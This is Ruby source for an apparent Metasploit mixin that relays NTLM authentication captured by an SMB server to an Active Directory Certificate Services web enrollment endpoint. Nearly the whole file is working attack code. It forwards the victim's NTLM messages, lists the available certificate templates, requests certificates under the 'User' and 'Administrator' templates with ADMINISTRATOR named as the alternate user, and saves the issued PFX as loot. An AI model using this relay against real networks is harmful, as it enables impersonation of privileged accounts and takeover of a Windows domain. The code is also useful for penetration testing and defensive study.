###
#
# This mixin provides support for reporting captured SMB creds
#
###

module Msf::Exploit::Remote::SMB::Server::HttpRelay

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::NTLM::Client
  include Msf::Exploit::Remote::SMB::Server::HashCapture

  def create_csr(private_key, alt_usr)
    print_status("Generating CSR...")
    request = OpenSSL::X509::Request.new
    request.version = 1
    request.subject = OpenSSL::X509::Name.new([
                                                ['CN', alt_usr, OpenSSL::ASN1::UTF8STRING]
                                              ])
    request.public_key = private_key.public_key
    request.sign(private_key, OpenSSL::Digest.new('SHA256'))
    print_status("CSR Generated")
    request
  end

  def handle_error(error_msg)
    @http_client = nil
    print_error(error_message)
  end

  def http_client
    return @http_client unless @http_client.nil?
    begin
      @http_client = Rex::Proto::Http::Client.new(datastore['RHOST'],
                                                  datastore['RPORT'],
                                                  {},
                                                  datastore['SSL'],
                                                  datastore['ssl_version'],
                                                  proxies,
                                                  nil,
                                                  nil)
      @http_client.connect
    rescue Exception => e
      print_error(e.to_s)
    end
    @http_client
  end

  def relay_ntlm_type1(ntlm_type1)
    print_status("Relaying NTLM Type 1")

    begin
      ntlm_type1.domain.force_encoding('ASCII-8BIT')
      ntlm_type1.workstation.force_encoding('ASCII-8BIT')

      print_status("Sending NTLM Handshake to HTTP Relay Target")
      req = http_client.request_raw(
        {
          'method'  => 'GET',
          'uri'     => '/certsrv/csertfnsh.asp',
          'headers' => {
                          'Accept-Encoding' => 'identity'
                       }
        })
      res = http_client._send_recv(req, 20, true)
      if res.code != 401
        print_error("Server returned #{res.code.to_s}")
        return nil
      else
        print_status("HTTP Target Available for Negotiation")
      end

      print_status("Relaying NTLM Message 1 to HTTP Target")
      req = http_client.request_raw(
        {
          'method'  => 'GET',
          'uri'     => '/certsrv/csertfnsh.asp',
          'headers' => {
            'Accept-Encoding' => 'identity',
            'Authorization' => 'NTLM ' + ntlm_type1.encode64 }
        })
      res = http_client._send_recv(req, 20, true)
      @ntlm_type1 = ntlm_type1
      ntlm_type2_b64 = res.headers['WWW-Authenticate'].split()[1]
      ntlm_type2 = Net::NTLM::Message.decode64(ntlm_type2_b64)

      # print_status("HTTP Client: #{http_client_socket}")
    rescue Exception => e
      print_error(e.to_s)
    end
    print_status("Received NTLM Type 2 from HTTP Relay Target")
    print_status("Returning NTLM Type 2 to SMB Client")
    @ntlm_type2 = ntlm_type2
    return @ntlm_type2
  end

  def get_cert_list
    begin
      req = http_client.request_raw(
        {
          'method'  => 'GET',
          'uri'     => '/certsrv/certrqxt.asp'
        })
      res = http_client._send_recv(req, 20, true)
      user_list = res.body.scan(/^.*Option Value=\"E\;(.*?)\;/)
    rescue Exception => e
      print_error(e.to_s)
    end
    user_list
  end

  def relay_ntlm_type3(ntlm_type3)
    print_status("Recieved NTLM Type 3 from SMB Client")

    begin
      # required to call encode64 on ntlm message
      ntlm_type3.domain = ntlm_type3.domain.force_encoding('ASCII-8BIT')
      ntlm_type3.user = ntlm_type3.user.force_encoding('ASCII-8BIT')
      ntlm_type3.workstation = ntlm_type3.workstation.force_encoding('ASCII-8BIT')
    rescue Exception => e
      print_error(e.to_s)
    end

    print_status("Relaying NTLM Type 3 to HTTP Target")
    begin
      req = http_client.request_raw(
        {
          'method'  => 'GET',
          'uri'     => '/certsrv/csertfnsh.asp',
          'headers' => {
            'Accept-Encoding' => 'identity',
            'Authorization' => 'NTLM ' + ntlm_type3.encode64 }
        })
      res = http_client._send_recv(req, 20, true)
    rescue Exception => e
      print_error(e.to_s)
    end
    report_ntlm_type3(
      address: datastore['RHOST'],
      ntlm_type1: @ntlm_type1,
      ntlm_type2: @ntlm_type2,
      ntlm_type3: ntlm_type3
    )
    print_status("res code = #{res.code}")
    cert_list = get_cert_list
    print_status('Available Certificates:')
    cert_list.each do |cert_entry|
      print_status(cert_entry[0].to_s)
    end
    retrieve_cert('User', 'ADMINISTRATOR')
    sleep(10)
    retrieve_cert('Administrator', 'ADMINISTRATOR')
  end

  def retrieve_cert(cert_template, alt_user)
    print_status("Sending Post to generate certificate for #{alt_user} using the #{cert_template} template")
    begin
      private_key = OpenSSL::PKey::RSA.new(4096)
      request = create_csr(private_key, cert_template)
      cert_template_string = "CertificateTemplate:#{cert_template}"
      req = http_client.request_cgi(
        {
          'method'  => 'POST',
          'uri'     => '/certsrv/certfnsh.asp',
          'ctype'  => 'application/x-www-form-urlencoded',
          'vars_post' => {
            'Mode' => 'newreq',
            'CertRequest' => request.to_s,
            'CertAttrib' => cert_template_string,
            'TargetStoreFlags' => 0,
            'SaveCert' => 'yes',
            'ThumbPrint' => ''
          }
        })
      res = http_client._send_recv(req, 20, true)
      print_status("Post Sent")
      if res&.code == 200
        print_status("Certificate Request Granted")
      else
        print_status("Certificate Request Not Granted")
        return false
      end
    rescue Exception => e
      print_error(e.to_s)
    end
    begin
      location_tag = res.body.match(/^.*location=\"(.*)\"/)[1]
      print_status("Certificate location tag = #{location_tag}")
      location_uri = "/certsrv/#{location_tag}"
      print_status("Requesting Certificate from Relay Target...")
      req = http_client.request_cgi(
        {
          'method'  => 'GET',
          'uri'     => location_uri
        })
      res = http_client._send_recv(req, 20, true)
      info = nil
      certificate = OpenSSL::X509::Certificate.new(res.body)
      pkcs12 = OpenSSL::PKCS12.create('', '', private_key, certificate)
      stored_path = store_loot('windows.ad.cs',
                               'application/x-pkcs12',
                               rhost,
                               pkcs12.to_der,
                               'certificate.pfx',
                               info)
      print_status("Certificate saved to #{stored_path}")
    rescue Exception => e
      print_error(e.to_s)
      return false
    end
    return true
  end

  class HTTPRelayNTLMProvider < ::RubySMB::Gss::Provider::NTLM
    # @param [::WindowsError::NTStatus] ntlm_type3_status A specific NT Status to return as the response to the NTLM
    #   type 3 message. If this value is nil, the message will be processed as normal.
    def initialize(allow_anonymous: false, allow_guests: false, default_domain: 'WORKGROUP', listener: nil, ntlm_type3_status: ::WindowsError::NTStatus::STATUS_ACCESS_DENIED)
      super(allow_anonymous: allow_anonymous, allow_guests: allow_guests, default_domain: default_domain)
      @listener = listener
      @ntlm_type3_status = ntlm_type3_status

    end

    # Needs overwritten to ensure our version of Authenticator is returned
    def new_authenticator(server_client)
      # build and return an instance that can process and track stateful information for a particular connection but
      # that's backed by this particular provider
      HTTPRelayAuthenticator.new(self, server_client)
    end

    attr_reader :listener
    attr_accessor :ntlm_type3_status
  end

  class HTTPRelayAuthenticator < ::RubySMB::Gss::Provider::NTLM::Authenticator

    def process_ntlm_type1(type1_msg)
      @ntlm_type1 = type1_msg
      @ntlm_type2 = @provider.listener.relay_ntlm_type1(type1_msg)
      @ntlm_type2
    end

    def process_ntlm_type3(type3_msg)
      @provider.listener.relay_ntlm_type3(type3_msg)
      return @provider.ntlm_type3_status unless @provider.ntlm_type3_status.nil?
    end


  end
end
